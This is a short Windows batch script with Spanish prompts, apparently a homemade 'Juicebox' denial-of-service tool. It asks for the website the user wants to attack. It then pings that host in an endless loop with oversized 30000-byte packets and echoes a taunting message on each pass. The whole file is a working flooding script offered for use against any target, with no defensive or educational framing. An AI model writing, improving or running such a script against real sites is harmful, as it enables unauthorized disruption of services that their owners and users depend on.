@echo off
title juicebox-001
color 04
echo .
echo .
echo ------------------------
echo [Bienvenido a Juicebox]
echo [Hecho por: Brainfxck]
echo [Version: 1.0]
echo ------------------------
echo --
echo -
echo Presiona cualquier tecla para continuar
echo.
echo.
pause >nul
:fnc0
cls
echo Recuerda que el ping solo sera valido si la pagina web esta bien escrita, por ejemplo: example.com
echo Notese que no hay nada de HTTPS Y www. solo es el nombre de la web junto el dominio
echo .
echo .
set /p objdos=Escribe el sitio web que deseas atacar : 
:bucle
ping -l 30000 -n 1 -w 75 %objdos% >nul
echo Cold you're so cold : %objdos% - Oh no no no no cold
goto bucle